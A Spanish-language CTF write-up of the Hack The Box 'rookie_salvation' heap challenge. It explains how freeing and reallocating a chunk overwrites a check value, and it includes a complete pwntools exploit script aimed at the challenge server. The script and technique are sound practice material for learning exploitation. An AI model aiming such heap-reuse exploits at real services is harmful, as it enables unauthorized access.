En este post os traigo el segundo reto de la categoría de PWN en el *Hack the Boo* de [Hack The Box](https://www.hackthebox.com). Este reto ha sido bastante especial para mí, ya que es el primer reto de heap que resuelvo en una competición como tal.

# Overview

La descripción nos dice:

> * Just let it freeee....
> * 0xdeadbeef? Nah, w3th4nds is better..
> * How much to allocate? 20? 0x20? 0x2000000000000?
> * Where is the offset to overwrite?
> * ESCAPE

Y se nos entrega un binario que podemos decompilar para ver lo siguiente:

```c
//main
//...
  pvVar1 = malloc(0x26);
  allocated_space = pvVar1;
  *(undefined8 *)((long)pvVar1 + 0x1e) = 0x6665656264616564;
  *(undefined *)((long)pvVar1 + 0x26) = 0;
//...

//road_to_salvation
//...
iVar1 = strcmp((char *)(allocated_space + 0x1e),"w3th4nds");
    if (iVar1 == 0) {
        success(&DAT_00102f98);
        local_48 = 0;
        local_40 = 0;
        local_38 = 0;
        local_30 = 0;
        local_28 = 0;
        local_20 = 0;
        __stream = fopen("flag.txt","r");
//...
```

Vemos que el programa comienza reservando un bloque y asignando un valor. Existe un menú que nos permite reservar y liberar memoria dinámica y seleccionar una opción que lee el valor que se asignó al principio, en caso de ser `w3th4nds`, devuelve la flag.

# Explotación

En este caso la explotación es muy sencilla. Dado que al liberar memoria, dicho bloque simplemente se almacena en caché, y que podemos reservar memoria. Es posible comenzar liberando el primer bloque y, a continuación, reservar un bloque de igual tamaño sobrescribiendo el valor objetivo.

El script para resolver el reto sería:

```python
#!/usr/bin/env python3
from pwn import *

exe = './rookie_salvation'
remote_addr = "138.197.185.246"
remote_port = 32260

if args.REMOTE:
    p = remote(remote_addr, remote_port)
else:
    p = process(exe)

def menu_choice(n: int):
    p.recvuntil(">")
    p.sendline(str(n).encode())

def reserve(size: int, data: bytes):
    menu_choice(1)
    p.recvuntil(":")
    p.sendline(str(size).encode())
    p.recvuntil(":")
    p.sendline(data)

def free_allocated():
    menu_choice(2)

free_allocated()

payload = b'A'*30 + b'w3th4nds'
reserve(32, payload)

menu_choice(3)

p.interactive()
```

Y esto sería todo, un ejercicio sencillito para practicar un poco de debugging y conceptos muy báscios de memoria dinámica.